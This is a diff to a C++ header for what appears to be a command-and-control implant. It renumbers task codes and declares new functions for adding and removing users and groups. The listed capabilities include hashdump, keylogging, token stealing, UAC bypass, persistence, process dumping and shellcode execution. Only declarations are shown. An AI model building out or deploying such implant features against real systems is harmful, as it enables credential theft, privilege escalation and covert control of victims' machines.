@@ -51,43 +51,49 @@
 #define TASK_DOWNLOAD           0x09
 #define TASK_ENV_LS             0x10
 #define TASK_FIND               0x11
-#define TASK_GROUP_LS           0x12
-#define TASK_HASHDUMP           0x13
-#define TASK_HISTORY            0x14
-#define TASK_IP                 0x15
-#define TASK_JITTER             0x16
-#define TASK_KEYLOG             0x17
-#define TASK_KILL               0x18
-#define TASK_KILLDATE           0x19
-#define TASK_LS                 0x20
-#define TASK_MIGRATE            0x21
-#define TASK_MKDIR              0x22
-#define TASK_MV                 0x23
-#define TASK_NET                0x24
-#define TASK_PE                 0x25
-#define TASK_PERSIST            0x26
-#define TASK_PROCDUMP           0x27
-#define TASK_PS_KILL            0x28
-#define TASK_PS_LS              0x29
-#define TASK_PWD                0x30
-#define TASK_REG_QUERY          0x31
-#define TASK_RM                 0x32
-#define TASK_RMDIR              0x33
-#define TASK_RPORTFWD_ADD       0x34
-#define TASK_RPORTFWD_LS        0x35
-#define TASK_RPORTFWD_RM        0x36
-#define TASK_RUNAS              0x37
-#define TASK_SCREENSHOT         0x38
-#define TASK_SHELLCODE          0x39
-#define TASK_SLEEP              0x40
-#define TASK_SYSINFO            0x41
-#define TASK_TOKEN_REVERT       0x42
-#define TASK_TOKEN_STEAL        0x43
-#define TASK_UAC                0x44
-#define TASK_UPLOAD             0x45
-#define TASK_USER_LS            0x46
-#define TASK_WHOAMI             0x47
-#define TASK_WHOAMI_PRIV        0x48
+#define TASK_GROUP_ADD          0x12
+#define TASK_GROUP_ADDUSER      0x13
+#define TASK_GROUP_LS           0x14
+#define TASK_GROUP_RM           0x15
+#define TASK_GROUP_RMUSER       0x16
+#define TASK_GROUP_USERS        0x17
+#define TASK_HASHDUMP           0x18
+#define TASK_HISTORY            0x19
+#define TASK_IP                 0x20
+#define TASK_JITTER             0x21
+#define TASK_KEYLOG             0x22
+#define TASK_KILL               0x23
+#define TASK_KILLDATE           0x24
+#define TASK_LS                 0x25
+#define TASK_MIGRATE            0x26
+#define TASK_MKDIR              0x27
+#define TASK_MV                 0x28
+#define TASK_NET                0x29
+#define TASK_PE                 0x30
+#define TASK_PERSIST            0x31
+#define TASK_PROCDUMP           0x32
+#define TASK_PS_KILL            0x33
+#define TASK_PS_LS              0x34
+#define TASK_PWD                0x35
+#define TASK_REG_QUERY          0x36
+#define TASK_RM                 0x37
+#define TASK_RPORTFWD_ADD       0x38
+#define TASK_RPORTFWD_LS        0x39
+#define TASK_RPORTFWD_RM        0x40
+#define TASK_RUNAS              0x41
+#define TASK_SCREENSHOT         0x42
+#define TASK_SHELLCODE          0x43
+#define TASK_SLEEP              0x44
+#define TASK_SYSINFO            0x45
+#define TASK_TOKEN_REVERT       0x46
+#define TASK_TOKEN_STEAL        0x47
+#define TASK_UAC                0x48
+#define TASK_UPLOAD             0x49
+#define TASK_USER_ADD           0x50
+#define TASK_USER_LS            0x51
+#define TASK_USER_RM            0x52
+#define TASK_WHOAMI             0x53
+#define TASK_WHOAMI_PRIV        0x54
 
 namespace Task
 {
@@ -149,7 +155,12 @@ namespace Task
     std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring EnvLs(State::PSTATE pState);
     std::wstring Find(State::PSTATE pState, const std::wstring& wPath, const std::wstring& wName);
+    std::wstring GroupAdd(State::PSTATE pState, const std::wstring& wName);
+    std::wstring GroupAddUser(State::PSTATE pState, const std::wstring& wGroupname, const std::wstring& wUsername);
     std::wstring GroupLs(State::PSTATE pState);
+    std::wstring GroupRm(State::PSTATE pState, const std::wstring& wName);
+    std::wstring GroupRmUser(State::PSTATE pState, const std::wstring& wGroupname, const std::wstring&wUsername);
+    std::wstring GroupUsers(State::PSTATE pState, const std::wstring& wGroupname);
     std::wstring Hashdump(State::PSTATE pState);
     std::wstring History(State::PSTATE pState);
     std::wstring Ip(State::PSTATE pState);
@@ -169,8 +180,7 @@ namespace Task
     std::wstring PsLs(State::PSTATE pState, const std::wstring& wFilter, const std::wstring& wExclude);
     std::wstring Pwd(State::PSTATE pState);
     std::wstring RegQuery(State::PSTATE pState, const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecursive);
-    std::wstring Rm(State::PSTATE pState, const std::wstring& wFile);
-    std::wstring Rmdir(State::PSTATE pState, const std::wstring& wDir);
+    std::wstring Rm(State::PSTATE pState, const std::wstring& wPath, BOOL bRecursive);
     std::wstring RportfwdAdd(State::PSTATE pState, const std::wstring& wLIP, const std::wstring& wLPort, const std::wstring& wFwdIP, const std::wstring& wFwdPort);
     std::wstring RportfwdLs(State::PSTATE pState);
     std::wstring RportfwdRm(State::PSTATE pState);
@@ -183,7 +193,9 @@ namespace Task
     std::wstring TokenSteal(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
     std::wstring Uac(State::PSTATE pState, const std::wstring& wTechnique);
     std::wstring Upload(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
-    std::wstring Users(State::PSTATE pState);
+    std::wstring UserAdd(State::PSTATE pState, const std::wstring& wUsername, const std::wstring& wPassword);
+    std::wstring UserLs(State::PSTATE pState);
+    std::wstring UserRm(State::PSTATE pState, const std::wstring& wUsername);
     std::wstring Whoami(State::PSTATE pState);
     std::wstring WhoamiPriv(State::PSTATE pState);
 }
